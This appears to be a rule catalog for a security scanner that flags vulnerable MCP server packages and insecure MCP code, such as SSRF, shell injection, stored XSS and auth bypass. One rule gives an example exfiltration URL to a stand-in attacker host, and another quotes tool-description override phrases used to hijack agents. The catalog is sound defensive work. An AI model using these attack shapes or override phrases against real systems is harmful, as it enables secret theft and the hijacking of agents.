rules.limitations: Reports `d365fo-mcp` below 1.11.0 where a package.json, lockfile or MCP config states the version, reporting a range that admits an affected version. It reads the package version a project declares, not the deployment: the `apiKey` default in infrastructure/azuredeploy.json or main.bicep, the App Service's `API_KEY` setting, and whether a network restriction or upstream authentication sits in front of the listener are not read, so a 1.10.1 behind Easy Auth is reported and a 1.11.0 started with `ALLOW_UNAUTHENTICATED=true` is not. `latest` was 1.21.0 on 2026-10-22 and states no version, so an unversioned `npx d365fo-mcp` launch, or a config that runs a global install by its bare name, is not reported, and an MCP config that points at a deployed App Service by URL carries no version and is not read. npm's `@zhound/d365fo-mcp-server` and `@d365portal/d365fo-context-mcp` are other projects, `@iflow-mcp/dynamics365ninja-d365fo-mcp-server` is a republication on its own 1.0.x line, and `d365fo-mcp-server` is the repository's name, not a package; none is matched. PyPI has no `d365fo-mcp`, so a `uvx` launch is not read. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `d365fo-mcp` to 1.11.0 or later and pin it, and redeploy from the 1.11.0 templates, which require the key. On any version set `API_KEY` on the App Service to a strong random value (`openssl rand -hex 32`), or keep the listener on `HOST=127.0.0.1`, or put App Service Easy Auth, a Private Endpoint or an authenticating proxy in front of it; then check that the public `/mcp` endpoint answers `tools/call` with 401 when no key is sent, and rotate anything the indexed X++ source exposed.
rules.title: D365 F&O MCP Server below 1.11.0: the documented Azure deployment serves /mcp unauthenticated by default

rules.description: `dbt-mcp` before 1.17.1 appends unsanitized `node_selection` / `resource_type` values to the dbt subprocess argv, letting an MCP client inject dbt global flags such as `--profiles-dir` / `--project-dir` / `--target` into `subprocess.Popen` even with `shell=False` (CVE-2026-44968); it also emits every tool call's full arguments (`sql_query`, `vars`, `node_selection`) through telemetry (CVE-2026-44970, on by default) and file logging (CVE-2026-44969) without redaction. Treat < 1.17.1 (and unpinned) as exposed.
rules.limitations: Reads `dbt-mcp` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `dbt-mcp` to >= 1.17.1 and pin it. Validate `node_selection` / `resource_type` against an allow-list before adding them to argv, and redact tool arguments in telemetry / logs.
rules.title: dbt-mcp flag injection + tool-arg leakage (`dbt-mcp` < 1.17.1)

rules.description: `@arikusi/deepseek-mcp-server` from 1.4.2 up to (not including) 1.8.0 accepts caller-supplied `session_id` values in its process-global `SessionStore` without binding them to an authenticated principal, so an attacker can enumerate active sessions via `deepseek_sessions` and resume a victim's conversation via `deepseek_chat` (CVE-2026-55604, CVSS 8.6); its self-hosted HTTP transport also exposes `POST /mcp` with no `authProvider`, letting an unauthenticated client initialize a session and invoke tools that use the server-side `DEEPSEEK_API_KEY` (CVE-2026-55605, CVSS 5.3). Both fixed by 1.8.0.
rules.limitations: Reads `@arikusi/deepseek-mcp-server` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, reporting a range that admits an affected version and a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `@arikusi/deepseek-mcp-server` to >= 1.8.0 and pin it. Bind session IDs to an authenticated principal / transport session, and configure an `authProvider` so `POST /mcp` is not reachable unauthenticated.
rules.title: @arikusi/deepseek-mcp-server < 1.8.0 (unbound session IDs + unauth HTTP transport)

rules.description: Server or client code declares or exercises the `roots` capability — the `roots/list` request, the `notifications/roots/list_changed` notification, or the SDK aliases (`list_roots`, `ListRootsRequest`, `send_roots_list_changed`). The ratified MCP 2026-07-28 spec deprecates `roots` (SEP-2577) under the new 12-month deprecation policy (SEP-2596): it stays functional for at least a year but is on the removal path. Roots leaked the client's workspace layout to every connected server, which the RC judged an unnecessary standing surface.
rules.limitations: In .py, .ts, .tsx, .js, .jsx, .mjs, .cjs, .rs, .java and .kt sources it looks for `roots/list`, `notifications/roots/list_changed`, `ListRootsRequest`, `ListRootsResult`, `send_roots_list_changed`, `sendRootsListChanged` and `RootsListChangedNotification`, and, in a file that also contains `modelcontextprotocol`, `FastMCP`, `McpServer`, `@mcp.`, `mcp.server`, `from mcp`, `import mcp` (each as whole words), `ServerCapabilities` or `mcpServers`, for `list_roots(`, `listRoots(`, `ServerCapabilities(` with `roots=` before its first `)`, or a `capabilities: { ... }` literal that names roots before its first closing brace. In JSON, any `capabilities` object or list that lists roots counts, wherever the key sits, in `.mcp.json` and any `*.mcp.json` at any depth, and `mcp.json`, `claude_desktop_config.json`, `package.json` and the per-editor `mcp.json` files (`.cursor`, `.vscode`, `.windsurf`, `.amazonq`, `.roo`, `.kiro`) directly under the project root. The same `roots/list` request in a Go file, and a `capabilities` object in `config/servers.json`, are not read.
rules.remediation: Migrate before removal: stop advertising / handling the `roots` capability and pass the specific workspace paths a tool needs as explicit tool parameters or server configuration instead. Deprecated 2026-07-28; plan to remove ahead of the ~mid-2027 window.
rules.title: Use of deprecated `roots` capability (roots/list)

rules.description: Server or client code declares or exercises the `sampling` capability — the `sampling/createMessage` request, a `CreateMessageRequest` handler, or the SDK aliases (`create_message`, `.sampling.create`). The MCP ratified 2026-07-28 spec deprecates `sampling` (SEP-2577) under the 12-month deprecation policy (SEP-2596). Server-initiated sampling made the server a privileged caller of the host LLM and had no clean stateless story; it is on the removal path. (Distinct from AAK-MCP-SAMPLING-001, which flags sampling wired up without a consent gate — this rule flags the deprecated capability itself.)
rules.limitations: In .py, .ts, .tsx, .js, .jsx, .mjs, .cjs, .rs, .java and .kt sources it looks for `sampling/createMessage`, `CreateMessageRequest` (or `CreateMessageRequestSchema`) and `RequestSampling`, and, in a file that also contains `modelcontextprotocol`, `FastMCP`, `McpServer`, `@mcp.`, `mcp.server`, `from mcp`, `import mcp` (each as whole words), `ServerCapabilities` or `mcpServers`, for `create_message(`, `.sampling.create(`, `ServerCapabilities(` with `sampling=` before its first `)`, or a `capabilities: { ... }` literal that names sampling before its first closing brace. In JSON, any `capabilities` object or list that lists sampling counts, wherever the key sits, in `.mcp.json` and any `*.mcp.json` at any depth, and `mcp.json`, `claude_desktop_config.json`, `package.json` and the per-editor `mcp.json` files (`.cursor`, `.vscode`, `.windsurf`, `.amazonq`, `.roo`, `.kiro`) directly under the project root. In sources, the TypeScript SDK call `server.createMessage({...})`, a capabilities literal with a nested object ahead of `sampling`, and `create_message(` in a file that names no MCP SDK are not matched; neither is a `capabilities` object in `config/servers.json`.
rules.remediation: Migrate before removal: instead of asking the client to sample via `sampling/createMessage`, call the LLM provider API directly from the server with its own credentials. Deprecated 2026-07-28; plan to remove ahead of the ~mid-2027 window.
rules.title: Use of deprecated `sampling` capability (sampling/createMessage)

rules.description: Server or client code declares or exercises the `logging` capability — the `logging/setLevel` request, the `notifications/message` log notification, or the SDK aliases (`set_level`, `SetLevelRequest`, `LoggingMessageNotification`, `LoggingLevel`). The ratified MCP 2026-07-28 spec deprecates `logging` (SEP-2577) under the 12-month deprecation policy (SEP-2596). Protocol-level log-level control was redundant with host-side observability and is on the removal path.
rules.limitations: In .py, .ts, .tsx, .js, .jsx, .mjs, .cjs, .rs, .java and .kt sources it looks for `logging/setLevel`, `SetLevelRequest` (or `SetLevelRequestSchema`), `LoggingMessageNotification` and `LoggingLevel`, and, in a file that also contains `modelcontextprotocol`, `FastMCP`, `McpServer`, `@mcp.`, `mcp.server`, `from mcp`, `import mcp` (each as whole words), `ServerCapabilities` or `mcpServers`, for `ServerCapabilities(` with `logging=` before its first `)`, or a `capabilities: { ... }` literal that names logging before its first closing brace. In JSON, any `capabilities` object or list that lists logging counts, wherever the key sits, in `.mcp.json` and any `*.mcp.json` at any depth, and `mcp.json`, `claude_desktop_config.json`, `package.json` and the per-editor `mcp.json` files (`.cursor`, `.vscode`, `.windsurf`, `.amazonq`, `.roo`, `.kiro`) directly under the project root. In sources, sending log notifications through the SDK (`server.sendLoggingMessage({...})`, `await ctx.info(...)`), a capabilities literal with a nested object ahead of `logging`, and one in a file that names no MCP SDK are not matched; neither is a `capabilities` object in `config/servers.json`.
rules.remediation: Migrate before removal: emit logs to stderr or an OpenTelemetry exporter and control verbosity out-of-band, rather than advertising the `logging` capability / handling `logging/setLevel`. Deprecated 2026-07-28; plan to remove ahead of the ~mid-2027 window.
rules.title: Use of deprecated `logging` capability (logging/setLevel)

rules.description: A destination that arrives through MCP server / webhook configuration — `server_url`, `webhook_url`, `mcp_server_url` and the like — is passed to an outbound HTTP call without a destination check, so a caller who can write that configuration steers the server at internal addresses and cloud metadata endpoints (`http://169.254.169.254/`). Two disclosed shapes, one defect. **Absence** (CVE-2026-86122, Rowboat through 0.9.1, CVSS 5.0): nothing in the module resolves or range-checks a destination at all. **Asymmetry** (CVE-2026-85666, OGX / ex-Llama Stack, CVSS 7.5): the guard exists and is called — OGX applies `validate_url_not_private()` to its other URL inputs — and is simply not applied to this one; on the default starter configuration, which runs unauthenticated, that also forwards attacker-supplied headers and bearer tokens to the chosen destination. The asymmetry arm is the higher-precision signal, and it is the same class this scanner already detects at two other layers: `AAK-MCPWN-001` (auth middleware present on one route but not its twin) and `AAK-MCP-TOOLGATE-ASYMMETRY-001` (a gate enforced in `tools/list` but not `tools/call`). Those two rules carry their own CVEs and are named here as the family, not as coverage this rule provides.
rules.limitations: Python only, and scoped to configuration-shaped destination names. A caller-supplied URL arriving as a tool *argument* is AAK-MCP-SSRF-001's surface, not this rule's; bare `url` is deliberately not matched because it is the most common identifier in any HTTP code.
rules.remediation: Validate the destination on every path that can reach an outbound call, not on the paths that happened to get a guard first. Resolve the host once, reject private, loopback, link-local and metadata ranges on the *resolved IP*, and connect to that pinned address. Where a guard already exists in the module, the fix is usually to call it here too rather than to write a second one — and never forward caller-supplied `Authorization` headers to a destination the caller also chose.
rules.title: MCP-configured destination reaches an outbound fetch with no guard (absence or asymmetry)

rules.description: Dify (langgenius/dify), a self-hosted LLM app platform, can publish an app as an MCP server. Before 1.16.0, `PUT /console/api/apps/<app_id>/server` loaded the AppMCPServer by the server id the client sent, without checking that it belonged to the requested app and tenant, so an authenticated workspace member could change another app's MCP server status and parameters, redirecting its data or switching it off (CVE-2026-105761, CVSS 3.1 7.1, CWE-639, GHSA-ccrj-frp2-c945). The server ships as the Docker Hub image `langgenius/dify-api`, which Dify's compose file pins by version. 1.16.0 looks the server up by its app and tenant (fix commit `62cb5b5`).
rules.limitations: Reads `langgenius/dify-api` image references below 1.16.0 in compose files, Kubernetes manifests, Helm values, Dockerfiles and MCP configs. The bare Docker Hub name is matched, so `docker.io/langgenius/dify-api` is not read. `latest` was 1.17.1 on 2026-10-06, so an untagged reference is not reported. A source checkout run without the image states no version AAK reads, and `langgenius/dify-web` is not pinned because the endpoint is in the API server.
rules.remediation: Upgrade the `langgenius/dify-api` image to 1.16.0 or later and pin its tag.
rules.title: Dify below 1.16.0: a workspace member can change another app's MCP server

rules.description: `awslabs.documentdb-mcp-server` before 1.0.12 has incorrect authorization in its aggregation-pipeline tool: write-capable pipeline stages bypass the read-only-mode enforcement, so an authenticated MCP client can perform inappropriate write operations on the connected database (CVE-2026-18954, CVSS 5.5). A pinnable PyPI artifact (latest 1.0.14) the pin scanner resolves from `requirements.txt` / `pyproject.toml` / `uv.lock` / `.mcp.json`; the fifth pin in the existing `awslabs.*-mcp-server` family.
rules.limitations: Reads `awslabs.documentdb-mcp-server` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `awslabs.documentdb-mcp-server` to >= 1.0.12 and pin it. Do not rely on read-only mode alone; confirm the server rejects write-capable aggregation stages when a client is scoped read-only.
rules.title: AWS Labs DocumentDB MCP Server aggregation-pipeline authorization bypass (< 1.0.12)

rules.description: EdgeEver is a self-hosted knowledge base with a built-in MCP server. Its image, `ghcr.io/tianma-if/edgeever`, serves the API, the MCP tools and the web UI. Through 1.112.0 the web UI writes a dragged memo's label into `innerHTML` in `setMemoDragPreview`, so a notebook name or memo title set through the MCP `create_notebook`, `rename_notebook` or `create_memo` tools runs as script when the user drags it (CVE-2026-109557, CVSS 3.1 8.7, CWE-79). `TemplatesPane` renders a template's Markdown through `marked` into `dangerouslySetInnerHTML` with no sanitizer, so a template written with an API or MCP token runs script on preview (CVE-2026-109558, CVSS 3.1 8.7, CWE-79). In the desktop app that script can reach the privileged `window.edgeeverDesktop` bridge and its session token. An agent steered by prompt injection can plant either payload. Checked in the source: both sinks and the three MCP tools are in 1.33.0, the oldest image tag, and in 1.112.0, and 1.113.0 (`6b5027e8`) sets the drag label with `textContent` and passes template HTML through DOMPurify.
rules.limitations: Reads `ghcr.io/tianma-if/edgeever` references below 1.113.0 in compose files, Kubernetes manifests, Helm values, Dockerfiles and MCP configs. The project's own compose file takes the tag from `${EDGE_EVER_VERSION:-latest}`, and its Docker guide sets that variable in the shell (`export EDGE_EVER_VERSION=vX.Y.Z`), which no file states, so a deployment that follows the guide is not reported. Its one-command installer pulls `latest` and updates it daily, and `latest` was the 1.120.0 digest on 2026-10-15, so an untagged reference is not reported either. The desktop app and the Cloudflare deployment state no image tag and are not read.
rules.remediation: Upgrade the `ghcr.io/tianma-if/edgeever` image to 1.113.0 or later and pin the tag, and update the desktop app, which renders the same views. Until then, give MCP and API tokens only to trusted agents, and check notebook names, memo titles and templates for HTML.
rules.title: EdgeEver image below 1.113.0: notebook names, memo titles and templates written through MCP run as script (stored XSS)

rules.description: `@elvix.is/sdk` (npm; 021is/elvix-sdk) is a sign-in SDK that also ships an MCP server (`elvix mcp`, `elvix-mcp`), whose tools call the elvix API with the configured `ELVIX_API_KEY` as a Bearer token. From 0.1.0 to 0.10.1 the shared tool handler builds the request URL as `new URL(args.path ?? tool._meta.path, baseUrl)`, so an absolute URL in the caller-supplied `path` replaces the base URL, and the server sends the request, API key included, to a loopback, internal, cloud-metadata or attacker host (CVE-2026-108542, CVSS 3.1 6.3, CWE-918). Checked in the npm tarballs: 0.1.0 and 0.10.1 build the URL this way, and 0.10.2 (`ed0c622`, 2026-08-30) binds every tool to its manifest path, refuses a URL outside the configured origin and does not follow redirects. npm marks 0.0.0 to 0.10.1 deprecated with a security notice; 0.0.0 is an empty placeholder with no MCP server.
rules.limitations: Reports `@elvix.is/sdk` from 0.1.0 below 0.10.2 in a package.json, lockfile or MCP config, and an unpinned reference such as `bunx @elvix.is/sdk mcp`, which this scanner reads as exposed. The pin reads the version, not whether the MCP server runs, so an app that uses the SDK only for sign-in is reported too. `elvix`, `elvix-sdk` and `@021is/elvix-sdk` are not npm packages and are not matched. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `@elvix.is/sdk` to 0.10.2 or later and pin it. Then rotate any elvix API key that was used with the MCP server, as the package's deprecation notice asks.
rules.title: @elvix.is/sdk MCP server below 0.10.2: a tool's path argument can send the elvix API key to any host

rules.description: An MCP server resolves `${VAR}` / `$VAR` placeholders against its own process environment (`process.env` in Node, `os.environ` / `os.path.expandvars` in Python) while parsing or validating a user-supplied MCP server config — typically the server URL. An authenticated user can then submit a URL like `https://attacker.example/?k=${JWT_SECRET}` and the server interpolates its own secrets into the outbound request, exfiltrating them to an attacker-controlled host. This is the CVE-2026-32625 class (LibreChat <= 0.8.3 resolved `${VAR}` against `process.env` during Zod validation of user-supplied MCP server URLs, leaking `CREDS_KEY`, `JWT_SECRET`, `MONGO_URI`, etc.; CWE-200, CVSS 9.6). Detected as a `${...}`-placeholder resolver that reads the process environment (`.replace(/.../, ... process.env ...)`, `os.path.expandvars(...)`, `.format(**os.environ)`) inside an MCP-server config/URL path.
rules.limitations: Reads Python and JavaScript/TypeScript files that mention MCP, and matches these resolver shapes: `os.path.expandvars(...)`, `.format(**os.environ)`, `.format_map(os.environ)` and `string.Template`'s `substitute(os.environ)` in Python, each also under an imported name (`from os.path import expandvars`, `from os import environ`), and a `.replace(...)` or `.replaceAll(...)` whose `${...}` replacer reads `process.env`, or a local name bound to it, in JavaScript or TypeScript. A resolver written another way is not reported: a Python `re.sub` that looks each `${NAME}` up in `os.environ` is missed.
rules.remediation: Never expand environment placeholders found inside a user-supplied value. Treat the MCP server URL/config as untrusted data: reject or percent-encode `${...}` sequences, and resolve env references only from a server-side allowlist of config keys that are known-safe to echo — never the full `process.env` / `os.environ`. Validate the resolved URL host against an allowlist before connecting.
rules.title: MCP server resolves ${VAR} placeholders against process.env on a user-supplied server config (secret exfiltration)

rules.description: `fast-mcp-telegram`, a Telegram MCP server, downloads the http(s) URLs given to its `send_message` and `send_message_to_phone` MCP tools and attaches them to the outgoing message. Before 0.30.1 the guard, `_validate_url_security`, compares the URL's literal hostname with a denylist and never resolves it, while the fetch (`httpx.AsyncClient.get`) resolves the name itself. A hostname that resolves to a loopback, private or link-local address therefore passes the guard and is fetched, even with `block_private_ips=True` and `allow_http_urls=False`, and the body comes back to the caller as a Telegram attachment, so the read is not blind (CVE-2026-55096, CVSS 3.1 7.1, CWE-918/CWE-184). 0.30.1 resolves the name with `socket.getaddrinfo` and blocks loopback, private and link-local results (fix commit `e6b3032c`). NVD and the advisory print the fixed version as "30.1"; the release on PyPI and the GitHub tag are 0.30.1.
rules.limitations: Reports a reference that names the package: a requirements, pyproject or lockfile entry, or `fast-mcp-telegram` in an MCP config, where an unpinned `uvx fast-mcp-telegram` is reported as unpinned, as for the other PyPI pins. It reads versions, not code: the defect's shape, a hostname-only guard before a fetch that resolves again, is the class `AAK-SSRF-TOCTOU-001` names, which recognises this guard in code since #855 and keeps firing on 0.30.1's source, whose fetch still resolves the name a second time. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `fast-mcp-telegram` to >= 0.30.1 and pin it. Until then, do not let an untrusted caller choose the attachment URLs `send_message` downloads, or run the server where loopback, private and cloud-metadata addresses are unreachable.
rules.title: fast-mcp-telegram below 0.30.1 fetches attachment URLs its SSRF guard never resolved

rules.description: mcp-ffmpeg (npm `mcp-ffmpeg`, bitscorp-mcp/mcp-ffmpeg), an MCP server for FFmpeg, builds the commands its `resize-video`, `extract-audio` and `get-video-info` tools run by placing the `videoPath` and `outputDir` parameters inside a double-quoted string handed to `child_process.exec`. A path holding `$()`, backticks or a closing double quote, which an existing file or directory name can carry, breaks out of the string, so a client or a prompt-injected agent that can name a file runs commands as the server's user (CVE-2026-117568, CVSS 7.0, CWE-78). Checked in the published npm packages: the MCP server first ships in 1.0.3 (1.0.0 to 1.0.2 are an Express upload service on fluent-ffmpeg with no MCP tools), and 1.0.5, the newest release (2025-03-13), still builds `ffmpeg -i "${absVideoPath}" ...` strings. bitscorp-mcp/mcp-ffmpeg#8 is open and there is no fixed release.
rules.limitations: Reports an npm reference to `mcp-ffmpeg` from 1.0.3: a package.json or lockfile entry, the package an `npx` launch in an MCP config names, or a config that runs a global install by that bare name. Presence-only from 1.0.3: every later version is reported, a future fixed one included, until the pin gets a floor, and so is a reference that states no version, which installs 1.0.5. 1.0.0 to 1.0.2 had no MCP tools and are not reported. PyPI's `mcp-ffmpeg` (priyanshum143/MCP-FFMPEG) is another project, so a Python requirement and a `uvx` launch are not matched. It reads the name and version, not which tools the client lets the model call. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Remove `mcp-ffmpeg` from agents that read untrusted content, or run it as a user that can reach nothing worth taking; there is no fixed release. A fork that passes FFmpeg its arguments as an array (`execFile`, or `spawn` without a shell) closes the injection.
rules.title: mcp-ffmpeg from 1.0.3: video paths reach a shell command string

rules.description: A registered MCP tool (Python `@mcp.tool` / `@server.tool`, TS `server.tool(...)`, Java `@Tool`, Rust `#[mcp_tool]`) carries a description containing imperative override language ('ignore previous', 'always call', 'this tool must be invoked first', 'supersedes all other tools') or a universal-suffix token from the FHI corpus (`agent_audit_kit/data/fhi_universal_suffixes.txt`). Function-Hijacking attacks steer the LLM planner into picking a malicious tool first regardless of intent — arXiv 2604.20994 reports 70-100% ASR on BFCL.
rules.limitations: Reads descriptions written as string literals at the registration site: `description="..."` on a Python `@mcp.tool(...)`, `@server.tool(...)` or `@app.tool(...)`, the second string argument of a TypeScript `server.tool("name", "description", ...)`, a Java `@Tool` or a Rust `#[mcp_tool]`. A TypeScript `registerTool(name, { description })` call, a template-literal description and a description kept in a constant are not read, and `ignore all previous instructions` is not matched. A source file over 512 KB is not read.
rules.remediation: Audit tool registration sites for descriptions that try to command the planner. Reject tools whose descriptions include directives like 'ignore previous instructions' or 'always invoke first'. Refresh the suffix corpus regularly with `aak corpus update --fhi`.
rules.title: MCP tool description carries adversarial-suffix shape

rules.description: `mcp-florence2` up to and including 0.3.13 has server-side request forgery in `get_images` (`src/mcp_florence2/__init__.py`): the `src` argument is fetched without validating the host or scheme, so a caller — or an indirect prompt injection reaching this tool — can steer the server at attacker-chosen internal endpoints (cloud metadata, loopback admin ports, RFC-1918 hosts) (CVE-2026-19984, CVSS 3.1 6.3). A public exploit exists. This is a **presence-only** pin, and for a different reason than the other no-fix pins: the vendor has ruled out a source change, stating that deployments needing SSRF protection should route HTTP(S) through an SSRF-safe proxy "without requiring changes to the mcp-florence2 source code". So there is no fixed version to wait for, and a future release does not clear this finding — the mitigation is deployment-side. Same SSRF-via-tool-argument shape as the `@adenot/mcp-google-search` `read_webpage` pin.

rules.description: Flowise (`flowise`, npm) before 3.1.4 allows an authenticated attacker to reach remote code execution through the Custom MCP node by two routes closed in the same release. Supplying npx package names in the `mcpServerConfig` parameter causes Flowise to invoke `npx` on attacker-controlled npm packages, running their install and entry-point code on the Flowise server (CVE-2026-91931, CVSS 8.5, CWE-78). Separately, the path validation applied to `mcpServerConfig` is bypassed by passing a clean filename in the `args` array while controlling the `cwd` parameter, so the resolved executable is taken from an attacker-chosen working directory (CVE-2026-91932, CVSS 8.5, CWE-20). Both are fixed in 3.1.4.
rules.limitations: Reads `flowise` in package.json, .mcp.json, mcp.json, claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles at the project root only, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`) or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). The `flowiseai/flowise` image tag is not read, in a compose file or in an MCP config that starts it with `docker run`. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `flowise` to >= 3.1.4 and pin it. Treat the Custom MCP node's `mcpServerConfig` as untrusted input even from authenticated users: allowlist the commands it may launch rather than validating the filename alone, and resolve them against a fixed directory instead of a caller-supplied `cwd`. Restrict who holds Flowise credentials, since both paths require only an authenticated session.
rules.title: flowise < 3.1.4 (Custom MCP node reaches RCE through npx package names and an unvalidated cwd)

rules.description: Flyto2 Core (`flyto-core`), an MCP-native execution kernel for AI-agent workflows, before 2.26.6 has `llm.chat` read provider credentials such as `OPENAI_API_KEY` and `ANTHROPIC_API_KEY` from the environment and send them in the `Authorization: Bearer` header to a caller-controlled `base_url`. An actor who can steer `base_url` to a public host that clears the SSRF guard receives the operator's provider key (CVE-2026-67425, CVSS 8.6). Fixed in 2.26.6; treat < 2.26.6 (and unpinned) as exposed. The env-var-key exfil-to-caller-controlled-endpoint class here is adjacent to the config-side env-secret exfil surface `AAK-MCP-ENV-PLACEHOLDER-EXFIL-001` covers. CVE-2026-55786 (CVSS 8.4) sits under the same floor: from 2.26.2 to 2.26.3 the HTTP MCP route (`POST /mcp`) takes `tools/call` requests without the `require_auth` dependency the REST execution routes use, so an unauthenticated caller can run `execute_module` with `sandbox.execute_shell` and a command of its choosing. Fixed in 2.26.4.
